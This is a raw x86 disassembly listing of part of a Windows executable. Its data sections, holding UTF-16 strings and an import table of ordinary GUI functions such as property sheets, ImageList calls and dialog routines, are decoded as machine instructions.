  427fd9:	add    BYTE PTR [bp+0x0],ch
  427fdd:	popa   
  427fde:	add    BYTE PTR [esi+0x0],ch
  427fe1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  427fe6:	add    BYTE PTR [ebp+0x0],dh
  427fe9:	ins    DWORD PTR es:[edi],dx
  427fea:	add    BYTE PTR [eax],al
  427fec:	add    BYTE PTR [edi+0x0],ch
  427fef:	jb     0x427ff1
  427ff1:	ja     0x427ff3
  427ff3:	imul   eax,DWORD PTR [eax],0x680073
  427ff9:	outs   dx,BYTE PTR ds:[esi]
  427ffa:	add    BYTE PTR [ecx+0x0],ch
  427ffd:	add    BYTE PTR fs:[ecx+0x0],ch
  428001:	ja     0x428003
  428003:	imul   eax,DWORD PTR [eax],0x65006e
  428009:	push   0x70000000
  42800e:	add    BYTE PTR [ecx+0x0],ah
  428011:	je     0x428013
  428013:	jbe    0x428015
  428015:	add    BYTE PTR gs:[ebp+0x0],ah
  428019:	je     0x42801b
  42801b:	add    BYTE PTR gs:[edi+0x0],ah
  42801f:	ins    BYTE PTR es:[edi],dx
  428020:	add    BYTE PTR [ecx+0x0],ah
  428023:	imul   eax,DWORD PTR [eax],0x66
  428029:	outs   dx,DWORD PTR ds:[esi]
  42802a:	add    BYTE PTR [esi+0x0],ch
  42802d:	je     0x42802f
  42802f:	popa   
  428030:	add    BYTE PTR [edi+0x0],dh
  428033:	push   ebx
  428034:	add    BYTE PTR [edi+0x0],ch
  428037:	arpl   WORD PTR [eax],ax
  428039:	imul   eax,DWORD PTR [eax],0x61
  42803c:	add    BYTE PTR [esi+0x0],dh
  42803f:	outs   dx,DWORD PTR ds:[esi]
  428040:	add    BYTE PTR [eax],al
  428042:	add    BYTE PTR [ebp+0x0],ch
  428045:	jns    0x428047
  428047:	add    BYTE PTR gs:[esi+0x0],ah
  42804b:	ins    BYTE PTR es:[edi],dx
  42804c:	add    BYTE PTR [ecx+0x0],ah
  42804f:	jns    0x428051
  428051:	jbe    0x428053
  428053:	popa   
  428054:	add    BYTE PTR [esi+0x0],ch
  428057:	popa   
  428058:	add    BYTE PTR [edi+0x0],ah
  42805b:	outs   dx,DWORD PTR ds:[esi]
  42805c:	add    BYTE PTR [eax],al
  42805e:	add    BYTE PTR [edi+0x0],ch
  428061:	jb     0x428063
  428063:	jae    0x428065
  428065:	imul   eax,DWORD PTR [eax],0x47006e
  42806b:	imul   eax,DWORD PTR [eax],0x70006d
  428071:	bound  eax,QWORD PTR [eax]
  428073:	outs   dx,DWORD PTR ds:[esi]
  428074:	add    BYTE PTR [eax+0x0],dh
  428077:	imul   eax,DWORD PTR [eax],0x650000
  42807d:	js     0x42807f
  42807f:	jae    0x428081
  428081:	outs   dx,DWORD PTR ds:[esi]
  428082:	add    BYTE PTR [ebx+0x0],dh
  428085:	popa   
  428086:	add    BYTE PTR [esi+0x0],ch
  428089:	je     0x42808b
  42808b:	add    BYTE PTR [eax],al
  42808d:	bound  eax,QWORD PTR [eax]
  42808f:	jns    0x428091
  428091:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428096:	add    BYTE PTR [eax+eax*1+0x74],ah
  42809a:	add    BYTE PTR [ecx+0x0],ah
  42809d:	add    BYTE PTR [eax],al
  42809f:	js     0x4280a1
  4280a1:	imul   eax,DWORD PTR [eax],0x610054
  4280a7:	imul   eax,DWORD PTR [eax],0x48006e
  4280ad:	popa   
  4280ae:	add    BYTE PTR [esi+0x0],ch
  4280b1:	add    BYTE PTR fs:[eax],al
  4280b4:	add    BYTE PTR [edi+0x0],cl
  4280b7:	ja     0x4280b9
  4280b9:	ins    BYTE PTR es:[edi],dx
  4280ba:	add    BYTE PTR [ebx+0x0],dh
  4280bd:	popa   
  4280be:	add    BYTE PTR [ebx+0x0],dh
  4280c1:	jo     0x4280c3
  4280c3:	popa   
  4280c4:	add    BYTE PTR [ecx+0x0],ch
  4280c7:	imul   eax,DWORD PTR [eax],0x72
  4280ca:	add    BYTE PTR [ebp+0x0],ah
  4280cd:	jbe    0x4280cf
  4280cf:	add    BYTE PTR [eax],al
  4280d1:	jb     0x4280d3
  4280d3:	jne    0x4280d5
  4280d5:	je     0x4280d7
  4280d7:	ins    DWORD PTR es:[edi],dx
  4280d8:	add    BYTE PTR [ebp+0x0],dh
  4280db:	arpl   WORD PTR [eax],ax
  4280dd:	jne    0x4280df
  4280df:	jo     0x4280e1
  4280e1:	add    BYTE PTR [eax],al
  4280e3:	jae    0x4280e5
  4280e5:	outs   dx,DWORD PTR ds:[esi]
  4280e6:	add    BYTE PTR [esi+0x0],ah
  4280e9:	imul   eax,DWORD PTR [eax],0x630062
  4280ef:	outs   dx,DWORD PTR ds:[esi]
  4280f0:	add    BYTE PTR [ecx+0x0],ch
  4280f3:	jb     0x4280f5
  4280f5:	jae    0x4280f7
  4280f7:	outs   dx,DWORD PTR ds:[esi]
  4280f8:	add    BYTE PTR [eax],al
  4280fa:	add    BYTE PTR [ebx+0x0],dl
  4280fd:	outs   dx,DWORD PTR ds:[esi]
  4280fe:	add    BYTE PTR [ebx+0x0],ah
  428101:	popa   
  428102:	add    BYTE PTR [ecx+0x0],ch
  428105:	jae    0x428107
  428107:	data16 add BYTE PTR [ecx+0x0],ah
  42810b:	jb     0x42810d
  42810d:	popa   
  42810e:	add    BYTE PTR [ecx+0x0],ch
  428111:	add    BYTE PTR [eax],al
  428113:	add    BYTE PTR [esi],cl
  428115:	adc    BYTE PTR [eax],al
  428117:	out    0x67,eax
  428119:	adc    BYTE PTR [eax],al
  42811b:	js     0x428144
  42811d:	adc    BYTE PTR [eax],al
  42811f:	test   al,0x13
  428121:	adc    BYTE PTR [eax],al
  428123:	fs push esi
  428125:	adc    BYTE PTR [eax],al
  428127:	jp     0x428149
  428129:	adc    BYTE PTR [eax],al
  42812b:	enter  0x1052,0x0
  42812f:	loop   0x4281a4
  428131:	adc    BYTE PTR [eax],al
  428133:	ja     0x4281a0
  428135:	adc    BYTE PTR [eax],al
  428137:	cmp    al,0x2b
  428139:	adc    BYTE PTR [eax],al
  42813b:	rcl    BYTE PTR [edx],1
  42813d:	adc    BYTE PTR [eax],al
  42813f:	sbb    DWORD PTR [eax+0x10],ebx
  428142:	add    BYTE PTR [esi],ah
  428144:	add    dl,BYTE PTR [eax]
  428146:	add    BYTE PTR [edi+0xc],dh
  428149:	adc    BYTE PTR [eax],al
  42814b:	mov    dh,BYTE PTR [ecx]
  42814d:	adc    BYTE PTR [eax],al
  42814f:	out    dx,al
  428150:	sbb    eax,0xed80010
  428155:	adc    BYTE PTR [eax],al
  428157:	add    eax,0x3300107f
  42815c:	jbe    0x42816e
  42815e:	add    BYTE PTR [ebx],dl
  428160:	add    DWORD PTR [edx+0x0],0x428117
  428167:	sbb    eax,DWORD PTR [ecx-0x7ee0ffbe]
  42816d:	inc    edx
  42816e:	add    BYTE PTR [ebx],ah
  428170:	add    DWORD PTR [edx+0x0],0x428127
  428177:	sub    eax,DWORD PTR [ecx-0x7ed0ffbe]
  42817d:	inc    edx
  42817e:	add    BYTE PTR [ebx],dh
  428180:	add    DWORD PTR [edx+0x0],0x428137
  428187:	cmp    eax,DWORD PTR [ecx-0x7ec0ffbe]
  42818d:	inc    edx
  42818e:	add    BYTE PTR [ebx-0x7f],al
  428191:	inc    edx
  428192:	add    BYTE PTR [edi-0x7f],al
  428195:	inc    edx
  428196:	add    BYTE PTR [ebx-0x7f],cl
  428199:	inc    edx
  42819a:	add    BYTE PTR [edi-0x7f],cl
  42819d:	inc    edx
  42819e:	add    BYTE PTR [ebx-0x7f],dl
  4281a1:	inc    edx
  4281a2:	add    BYTE PTR [edi-0x7f],dl
  4281a5:	inc    edx
  4281a6:	add    BYTE PTR [ebx-0x7f],bl
  4281a9:	inc    edx
  4281aa:	add    bl,ch
  4281ac:	add    DWORD PTR [edx+0x0],0x4281ef
  4281b3:	repz add DWORD PTR [edx+0x0],0x4281f7
  4281bb:	sti    
  4281bc:	add    DWORD PTR [edx+0x0],0x4281ff
  4281c3:	add    eax,DWORD PTR [edx-0x7df8ffbe]
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [ebx],cl
  4281cc:	add    BYTE PTR [edx+0x0],0xf
  4281d0:	add    BYTE PTR [edx+0x0],0x13
  4281d4:	add    BYTE PTR [edx+0x0],0x17
  4281d8:	add    BYTE PTR [edx+0x0],0x1b
  4281dc:	add    BYTE PTR [edx+0x0],0x1f
  4281e0:	add    BYTE PTR [edx+0x0],0x23
  4281e4:	add    BYTE PTR [edx+0x0],0x27
  4281e8:	add    BYTE PTR [edx+0x0],0x29
  4281ec:	or     al,0x10
  4281ee:	add    BYTE PTR [edx-0x57ffefc2],dl
  4281f4:	push   edi
  4281f5:	adc    BYTE PTR [eax],al
  4281f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f8:	outs   dx,DWORD PTR ds:[esi]
  4281f9:	adc    BYTE PTR [eax],al
  4281fb:	push   ebx
  4281fc:	popa   
  4281fd:	adc    BYTE PTR [eax],al
  4281ff:	add    dh,BYTE PTR [ebp+0x10]
  428202:	add    dh,cl
  428204:	jle    0x428216
  428206:	add    BYTE PTR [esi+edx*2],dl
  428209:	adc    BYTE PTR [eax],al
  42820b:	mov    al,0x68
  42820d:	adc    BYTE PTR [eax],al
  42820f:	aas    
  428210:	inc    esp
  428211:	adc    BYTE PTR [eax],al
  428213:	pop    ebp
  428214:	and    DWORD PTR [eax],edx
  428216:	add    bl,dl
  428218:	jl     0x42822a
  42821a:	add    BYTE PTR [edx+0xb],dh
  42821d:	adc    BYTE PTR [eax],al
  42821f:	inc    edx
  428220:	push   eax
  428221:	adc    BYTE PTR [eax],al
  428223:	mov    ebp,0xbb001074
  428228:	pop    ds
  428229:	adc    BYTE PTR [eax],al
  42822b:	sub    DWORD PTR [eax+0x10],eax
  42822e:	add    BYTE PTR [ecx],dh
  428230:	ja     0x428242
  428232:	add    bl,dl
  428234:	sbb    dl,BYTE PTR [eax]
  428236:	add    BYTE PTR [esi+0x1e],ch
  428239:	adc    BYTE PTR [eax],al
  42823b:	or     ch,BYTE PTR [esi]
  42823d:	adc    BYTE PTR [eax],al
  42823f:	sbb    eax,0xa100103e
  428244:	data16 adc BYTE PTR [eax],al
  428247:	xchg   ecx,eax
  428248:	bound  edx,QWORD PTR [eax]
  42824a:	add    BYTE PTR [esi],bh
  42824c:	dec    edi
  42824d:	adc    BYTE PTR [eax],al
  42824f:	in     eax,dx
  428250:	adc    BYTE PTR fs:[eax],al
  428253:	sub    bl,BYTE PTR [ecx+0x10]
  428256:	add    BYTE PTR [esi+0x43],al
  428259:	adc    BYTE PTR [eax],al
  42825b:	imul   edi,DWORD PTR [eax+edx*1],0x0
  42825f:	rol    BYTE PTR [esi+0x10],0x0
  428263:	in     eax,0x31
  428265:	adc    BYTE PTR [eax],al
  428267:	mov    esp,0x2b00104f
  42826c:	add    BYTE PTR [edx+0x0],0x2f
  428270:	add    BYTE PTR [edx+0x0],0x33
  428274:	add    BYTE PTR [edx+0x0],0x37
  428278:	add    BYTE PTR [edx+0x0],0x3b
  42827c:	add    BYTE PTR [edx+0x0],0x3f
  428280:	add    BYTE PTR [edx+0x0],0x43
  428284:	add    BYTE PTR [edx+0x0],0x47
  428288:	add    BYTE PTR [edx+0x0],0x4b
  42828c:	add    BYTE PTR [edx+0x0],0x4f
  428290:	add    BYTE PTR [edx+0x0],0x53
  428294:	add    BYTE PTR [edx+0x0],0x57
  428298:	add    BYTE PTR [edx+0x0],0x5b
  42829c:	add    BYTE PTR [edx+0x0],0x5f
  4282a0:	add    BYTE PTR [edx+0x0],0x63
  4282a4:	add    BYTE PTR [edx+0x0],0x67
  4282a8:	add    BYTE PTR [edx+0x0],0xe1
  4282ac:	and    dl,BYTE PTR [eax]
  4282ae:	add    bh,bh
  4282b0:	push   ecx
  4282b1:	adc    BYTE PTR [eax],al
  4282b3:	test   BYTE PTR ds:0x1d0c0010,0x10
  4282ba:	add    BYTE PTR [ebx],al
  4282bc:	sbb    dl,BYTE PTR [eax]
  4282be:	add    ch,ah
  4282c0:	or     dl,BYTE PTR [eax]
  4282c2:	add    BYTE PTR [edi+0x42001035],bl
  4282c8:	pop    edi
  4282c9:	adc    BYTE PTR [eax],al
  4282cb:	adc    eax,0xd300103f
  4282d0:	cmp    dl,BYTE PTR [eax]
  4282d2:	add    BYTE PTR [ebp+0x1001021],ah
  4282d8:	sbb    al,0x10
  4282da:	add    BYTE PTR [ebx-0x1effefd7],ch
  4282e0:	adc    BYTE PTR cs:[eax],al
  4282e3:	push   eax
  4282e4:	adc    BYTE PTR [bx+si],al
  4282e7:	mov    edi,0xab00102d
  4282ec:	add    BYTE PTR [edx+0x0],0xaf
  4282f0:	add    BYTE PTR [edx+0x0],0xb3
  4282f4:	add    BYTE PTR [edx+0x0],0xb7
  4282f8:	add    BYTE PTR [edx+0x0],0xbb
  4282fc:	add    BYTE PTR [edx+0x0],0xbf
  428300:	add    BYTE PTR [edx+0x0],0xc3
  428304:	add    BYTE PTR [edx+0x0],0xc7
  428308:	add    BYTE PTR [edx+0x0],0xcb
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0x98
  42832c:	pusha  
  42832d:	adc    BYTE PTR [eax],al
  42832f:	pop    ebp
  428330:	js     0x428342
  428332:	add    BYTE PTR [esi],bh
  428334:	dec    eax
  428335:	adc    BYTE PTR [eax],al
  428337:	cmp    al,0x7a
  428339:	adc    BYTE PTR [eax],al
  42833b:	aam    0x9
  42833d:	adc    BYTE PTR [eax],al
  42833f:	or     cl,BYTE PTR [ebx]
  428341:	adc    BYTE PTR [eax],al
  428343:	pop    ebx
  428344:	push   ebp
  428345:	adc    BYTE PTR [eax],al
  428347:	mov    esi,0x6001032
  42834c:	xor    edx,DWORD PTR [eax]
  42834e:	add    BYTE PTR [esi-0x16ffefc0],al
  428354:	and    eax,0x61460010
  428359:	adc    BYTE PTR [eax],al
  42835b:	adc    DWORD PTR [ebp+0x10],ebp
  42835e:	add    al,al
  428360:	dec    esi
  428361:	adc    BYTE PTR [eax],al
  428363:	jae    0x428383
  428365:	adc    BYTE PTR [eax],al
  428367:	dec    ebx
  428368:	add    eax,0x832b0010
  42836d:	inc    edx
  42836e:	add    BYTE PTR [edi],ch
  428370:	add    DWORD PTR [edx+0x0],0x33
  428374:	add    DWORD PTR [edx+0x0],0x37
  428378:	add    DWORD PTR [edx+0x0],0x3b
  42837c:	add    DWORD PTR [edx+0x0],0x3f
  428380:	add    DWORD PTR [edx+0x0],0x43
  428384:	add    DWORD PTR [edx+0x0],0x47
  428388:	add    DWORD PTR [edx+0x0],0x4b
  42838c:	add    DWORD PTR [edx+0x0],0x4f
  428390:	add    DWORD PTR [edx+0x0],0x53
  428394:	add    DWORD PTR [edx+0x0],0x57
  428398:	add    DWORD PTR [edx+0x0],0x5b
  42839c:	add    DWORD PTR [edx+0x0],0x5f
  4283a0:	add    DWORD PTR [edx+0x0],0x63
  4283a4:	add    DWORD PTR [edx+0x0],0x67
  4283a8:	add    DWORD PTR [edx+0x0],0x0
	...
  4283b4:	cmp    dh,BYTE PTR [ecx+0x52]
  4283b7:	dec    edi
  4283b8:	add    BYTE PTR [eax],al
  4283ba:	add    BYTE PTR [eax],al
  4283bc:	adc    BYTE PTR [ebp+0x10002],cl
  4283c2:	add    BYTE PTR [eax],al
  4283c4:	add    DWORD PTR [eax],eax
  4283c6:	add    BYTE PTR [eax],al
  4283c8:	add    DWORD PTR [eax],eax
  4283ca:	add    BYTE PTR [eax],al
  4283cc:	loopne 0x42835a
  4283ce:	add    al,BYTE PTR [eax]
  4283d0:	add    BYTE PTR [ebp-0x730ffffe],cl
  4283d6:	add    al,BYTE PTR [eax]
	...
  4283e4:	test   al,0x85
  4283e6:	add    al,BYTE PTR [eax]
  4283e8:	les    eax,FWORD PTR [ebp-0x7a29fffe]
  4283ee:	add    al,BYTE PTR [eax]
  4283f0:	call   0x42867a
  4283f5:	xchg   BYTE PTR [edx],al
  4283f7:	add    BYTE PTR [esi+eax*4],dl
  4283fa:	add    al,BYTE PTR [eax]
  4283fc:	xchg   BYTE PTR cs:[edx],al
  4283ff:	add    BYTE PTR [eax],al
  428401:	add    BYTE PTR [eax],al
  428403:	add    BYTE PTR [eax-0x7a],dl
  428406:	add    al,BYTE PTR [eax]
  428408:	outs   dx,BYTE PTR ds:[esi]
  428409:	xchg   BYTE PTR [edx],al
  42840b:	add    BYTE PTR [esi+eax*4+0x2],bh
  42840f:	add    BYTE PTR [edx-0x61fffd7a],cl
  428415:	xchg   BYTE PTR [edx],al
  428417:	add    BYTE PTR [esi+eax*4-0x7941fffe],ch
  42841e:	add    al,BYTE PTR [eax]
  428420:	rol    BYTE PTR [esi-0x7921fffe],1
  428426:	add    al,BYTE PTR [eax]
  428428:	lock xchg BYTE PTR [edx],al
  42842b:	add    BYTE PTR [edx],al
  42842d:	xchg   DWORD PTR [edx],eax
  42842f:	add    BYTE PTR [eax],dl
  428431:	xchg   DWORD PTR [edx],eax
  428433:	add    BYTE PTR [esi],bl
  428435:	xchg   DWORD PTR [edx],eax
  428437:	add    BYTE PTR [eax],dh
  428439:	xchg   DWORD PTR [edx],eax
  42843b:	add    BYTE PTR [edi+eax*4],bh
  42843e:	add    al,BYTE PTR [eax]
  428440:	push   edx
  428441:	xchg   DWORD PTR [edx],eax
  428443:	add    BYTE PTR [edi+eax*4+0x2],ah
  428447:	add    BYTE PTR [esi-0x79],dh
  42844a:	add    al,BYTE PTR [eax]
  42844c:	add    BYTE PTR [edi-0x786dfffe],0x2
  428453:	add    BYTE PTR [edx-0x47fffd79],ah
  428459:	xchg   DWORD PTR [edx],eax
  42845b:	add    ah,al
  42845d:	xchg   DWORD PTR [edx],eax
  42845f:	add    dh,dl
  428461:	xchg   DWORD PTR [edx],eax
  428463:	add    ah,ch
  428465:	xchg   DWORD PTR [edx],eax
  428467:	add    dh,bh
  428469:	xchg   DWORD PTR [edx],eax
  42846b:	add    BYTE PTR [eax+ecx*4],cl
  42846e:	add    al,BYTE PTR [eax]
  428470:	sbb    al,0x88
  428472:	add    al,BYTE PTR [eax]
  428474:	mov    BYTE PTR cs:[edx],al
  428477:	add    BYTE PTR [edx-0x78],al
  42847a:	add    al,BYTE PTR [eax]
  42847c:	pop    eax
  42847d:	mov    BYTE PTR [edx],al
  42847f:	add    BYTE PTR [edx-0x78],ch
  428482:	add    al,BYTE PTR [eax]
  428484:	jl     0x42840e
  428486:	add    al,BYTE PTR [eax]
  428488:	mov    WORD PTR [eax-0x7763fffe],cs
  42848e:	add    al,BYTE PTR [eax]
  428490:	lods   al,BYTE PTR ds:[esi]
  428491:	mov    BYTE PTR [edx],al
  428493:	add    BYTE PTR [esi-0x33fffd78],bh
  428499:	mov    BYTE PTR [edx],al
  42849b:	add    dl,bl
  42849d:	mov    BYTE PTR [edx],al
  42849f:	add    dl,dh
  4284a1:	mov    BYTE PTR [edx],al
  4284a3:	add    BYTE PTR [ecx+ecx*4],al
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	push   ss
  4284a9:	mov    DWORD PTR [edx],eax
  4284ab:	add    BYTE PTR [edx],ah
  4284ad:	mov    DWORD PTR [edx],eax
  4284af:	add    BYTE PTR [esi],ch
  4284b1:	mov    DWORD PTR [edx],eax
  4284b3:	add    BYTE PTR [edx],bh
  4284b5:	mov    DWORD PTR [edx],eax
  4284b7:	add    BYTE PTR [edx-0x77],cl
  4284ba:	add    al,BYTE PTR [eax]
  4284bc:	pusha  
  4284bd:	mov    DWORD PTR [edx],eax
  4284bf:	add    BYTE PTR [esi-0x77],ch
  4284c2:	add    al,BYTE PTR [eax]
  4284c4:	or     BYTE PTR [ecx-0x766dfffe],0x2
  4284cb:	add    BYTE PTR [eax],al
  4284cd:	add    BYTE PTR [eax],al
  4284cf:	add    BYTE PTR [ecx+ecx*4+0x2],ch
  4284d6:	add    BYTE PTR [eax],al
  4284d8:	retf   0x289
  4284db:	add    ah,bl
  4284dd:	mov    DWORD PTR [edx],eax
  4284df:	add    dh,ch
  4284e1:	mov    DWORD PTR [edx],eax
  4284e3:	add    BYTE PTR [edx+ecx*4],al
  4284e6:	add    al,BYTE PTR [eax]
  4284e8:	push   ss
  4284e9:	mov    al,BYTE PTR [edx]
  4284eb:	add    BYTE PTR [eax],ch
  4284ed:	mov    al,BYTE PTR [edx]
  4284ef:	add    BYTE PTR [eax],bh
  4284f1:	mov    al,BYTE PTR [edx]
  4284f3:	add    BYTE PTR [esi-0x76],dl
  4284f6:	add    al,BYTE PTR [eax]
  4284f8:	data16 mov al,BYTE PTR [edx]
  4284fb:	add    BYTE PTR [edx+ecx*4+0x2],dh
  4284ff:	add    BYTE PTR [edx+ecx*4-0x756dfffe],al
  428506:	add    al,BYTE PTR [eax]
  428508:	mov    ds:0xae00028a,al
  42850d:	mov    al,BYTE PTR [edx]
  42850f:	add    al,al
  428511:	mov    al,BYTE PTR [edx]
  428513:	add    dl,dl
  428515:	mov    al,BYTE PTR [edx]
  428517:	add    al,ch
  428519:	mov    al,BYTE PTR [edx]
  42851b:	add    dh,dh
  42851d:	mov    al,BYTE PTR [edx]
  42851f:	add    BYTE PTR [edx],al
  428521:	mov    eax,DWORD PTR [edx]
  428523:	add    BYTE PTR [ebx+ecx*4],bl
  428526:	add    al,BYTE PTR [eax]
  428528:	xor    al,0x8b
  42852a:	add    al,BYTE PTR [eax]
  42852c:	dec    esp
  42852d:	mov    eax,DWORD PTR [edx]
  42852f:	add    BYTE PTR [edx-0x75],bl
  428532:	add    al,BYTE PTR [eax]
  428534:	mov    ax,WORD PTR [edx]
  428537:	add    BYTE PTR [eax-0x75],bh
  42853a:	add    al,BYTE PTR [eax]
  42853c:	add    BYTE PTR [eax],al
  42853e:	add    BYTE PTR [eax],al
  428540:	cwde   
  428541:	mov    eax,DWORD PTR [edx]
  428543:	add    BYTE PTR [edx-0x4ffffd75],ah
  428549:	mov    eax,DWORD PTR [edx]
  42854b:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],bh
  428552:	add    al,BYTE PTR [eax]
  428554:	fimul  DWORD PTR [ebx-0x7419fffe]
  42855a:	add    al,BYTE PTR [eax]
  42855c:	lock mov eax,DWORD PTR [edx]
  42855f:	add    BYTE PTR [edx],al
  428561:	mov    WORD PTR [edx],es
  428563:	add    BYTE PTR [eax],bl
  428565:	mov    WORD PTR [edx],es
  428567:	add    BYTE PTR [esi],ch
  428569:	mov    WORD PTR [edx],es
  42856b:	add    BYTE PTR [esp+ecx*4+0x2],al
  42856f:	add    BYTE PTR [esp+ecx*4+0x2],dl
  428573:	add    BYTE PTR [esp+ecx*4+0x2],ah
  428577:	add    BYTE PTR [esp+ecx*4+0x2],dh
  42857b:	add    BYTE PTR [edx-0x65fffd74],al
  428581:	mov    WORD PTR [edx],es
  428583:	add    BYTE PTR [esp+ecx*4-0x734ffffe],ah
  42858a:	add    al,BYTE PTR [eax]
  42858c:	mov    esi,0x28c
	...
  42859d:	add    BYTE PTR [eax],al
  42859f:	add    BYTE PTR [ebx+0x6d],ah
  4285a2:	fs cs gs js 0x42860c
  4285a7:	add    BYTE PTR [edi],dl
  4285a9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285ad:	je     0x428621
  4285af:	outs   dx,DWORD PTR ds:[esi]
  4285b0:	jns    0x428602
  4285b2:	jb     0x428623
  4285b4:	jo     0x42861b
  4285b6:	jb     0x42862c
  4285b8:	jns    0x42860d
  4285ba:	push   0x50746565
  4285bf:	popa   
  4285c0:	add    BYTE PTR gs:[bx+si],al
  4285c4:	pop    esp
  4285c5:	add    BYTE PTR [eax+0x72],dl
  4285c8:	outs   dx,DWORD PTR ds:[esi]
  4285c9:	jo     0x428630
  4285cb:	jb     0x428641
  4285cd:	jns    0x428622
  4285cf:	push   0x57746565
  4285d4:	add    BYTE PTR [eax],al
  4285d6:	pop    ebx
  4285d7:	add    BYTE PTR [eax+0x72],dl
  4285da:	outs   dx,DWORD PTR ds:[esi]
  4285db:	jo     0x428642
  4285dd:	jb     0x428653
  4285df:	jns    0x428634
  4285e1:	push   0x41746565
  4285e6:	add    BYTE PTR [eax],al
  4285e8:	dec    esi
  4285e9:	add    BYTE PTR [ecx+0x6d],cl
  4285ec:	popa   
  4285ed:	addr16 gs dec esp
  4285f0:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  4285f7:	ins    BYTE PTR es:[edi],dx
  4285f8:	popa   
  4285f9:	arpl   WORD PTR [ebp+0x49],sp
  4285fc:	arpl   WORD PTR [edi+0x6e],bp
  4285ff:	add    BYTE PTR [ecx],dh
  428601:	add    BYTE PTR [ecx+0x6d],cl
  428604:	popa   
  428605:	addr16 gs dec esp
  428608:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42860f:	je     0x428683
  428611:	outs   dx,DWORD PTR ds:[esi]
  428612:	jns    0x428614
  428614:	inc    eax
  428615:	add    BYTE PTR [ecx+0x6d],cl
  428618:	popa   
  428619:	addr16 gs dec esp
  42861c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428623:	dec    ecx
  428624:	ins    DWORD PTR es:[edi],dx
  428625:	popa   
  428626:	addr16 gs inc ebx
  428629:	outs   dx,DWORD PTR ds:[esi]
  42862a:	jne    0x42869a
  42862c:	je     0x42862e
  42862e:	dec    esp
  42862f:	add    BYTE PTR [ecx+0x6d],cl
  428632:	popa   
  428633:	addr16 gs dec esp
  428636:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42863d:	outs   dx,DWORD PTR ds:[esi]
  42863e:	jbe    0x4286a5
  428640:	add    BYTE PTR [eax],al
  428642:	inc    ebx
  428643:	dec    edi
  428644:	dec    ebp
  428645:	inc    ebx
  428646:	push   esp
  428647:	dec    esp
  428648:	xor    esi,DWORD PTR [edx]
  42864a:	cs fs ins BYTE PTR es:[edi],dx
  42864d:	ins    BYTE PTR es:[edi],dx
  42864e:	add    BYTE PTR [eax],al
  428650:	push   edi
  428651:	add    BYTE PTR [ebx+0x72],al
  428654:	gs popa 
  428656:	je     0x4286bd
  428658:	inc    esp
  428659:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  428660:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428668:	jb     0x4286cb
  42866a:	ins    DWORD PTR es:[edi],dx
  42866b:	push   edi
  42866c:	add    BYTE PTR [eax],al
  42866e:	xor    al,BYTE PTR [edx]
  428670:	push   ebx
  428671:	gs je  0x4286b7
  428674:	popa   
  428675:	jb     0x4286dc
  428677:	je     0x4286c9
  428679:	outs   dx,DWORD PTR ds:[esi]
  42867a:	jae    0x42867c
  42867c:	cmp    al,BYTE PTR [ecx]
  42867e:	inc    edi
  42867f:	gs je  0x4286cf
  428682:	gs jae 0x4286f8
  428685:	popa   
  428686:	addr16 gs inc ecx
  428689:	add    BYTE PTR [edx+0x61724400],dh
  42868f:	ja     0x4286d7
  428691:	jb     0x4286f4
  428693:	ins    DWORD PTR es:[edi],dx
  428694:	gs inc ebx
  428696:	outs   dx,DWORD PTR ds:[esi]
  428697:	outs   dx,BYTE PTR ds:[esi]
  428698:	je     0x42870c
  42869a:	outs   dx,DWORD PTR ds:[esi]
  42869b:	ins    BYTE PTR es:[edi],dx
  42869c:	add    BYTE PTR [eax],al
  42869e:	sbb    BYTE PTR [ecx],al
  4286a0:	inc    edi
  4286a1:	gs je  0x4286ed
  4286a4:	arpl   WORD PTR [edi+0x6e],bp
  4286a7:	dec    ecx
  4286a8:	outs   dx,BYTE PTR ds:[esi]
  4286a9:	outs   dx,WORD PTR ds:[esi]
  4286ab:	add    bl,bh
  4286ad:	add    dl,BYTE PTR [edx+esi*2+0x61]
  4286b1:	arpl   WORD PTR [ebx+0x50],bp
  4286b4:	outs   dx,DWORD PTR ds:[esi]
  4286b5:	jo     0x42872c
  4286b7:	jo     0x428706
  4286b9:	outs   dx,BYTE PTR gs:[esi]
  4286bb:	jne    0x4286bd
  4286bd:	add    cl,bl
  4286bf:	add    DWORD PTR [ebp+0x6f],ecx
  4286c2:	outs   dx,BYTE PTR ds:[esi]
  4286c3:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4286cb:	push   edx
  4286cc:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  4286d1:	add    BYTE PTR [ebx+0x68],al
  4286d4:	popa   
  4286d5:	jb     0x42872c
  4286d7:	jo     0x428749
  4286d9:	gs jb  0x428733
  4286dc:	add    BYTE PTR [eax],al
  4286de:	add    dl,BYTE PTR ds:[ebx+0x65]
  4286e2:	je     0x428728
  4286e4:	ins    BYTE PTR es:[edi],dx
  4286e5:	addr16 dec ecx
  4286e7:	je     0x42874e
  4286e9:	ins    DWORD PTR es:[edi],dx
  4286ea:	push   esp
  4286eb:	gs js  0x428762
  4286ee:	inc    ecx
  4286ef:	add    BYTE PTR [edx+eax*1+0x53],bh
  4286f3:	push   0x774f776f
  4286f8:	outs   dx,BYTE PTR ds:[esi]
  4286f9:	gs fs push eax
  4286fc:	outs   dx,DWORD PTR ds:[esi]
  4286fd:	jo     0x428774
  4286ff:	jo     0x428774
  428701:	add    BYTE PTR [eax],bl
  428703:	add    dl,BYTE PTR [edx+0x65]
  428706:	ins    DWORD PTR es:[edi],dx
  428707:	outs   dx,DWORD PTR ds:[esi]
  428708:	jbe    0x42876f
  42870a:	push   eax
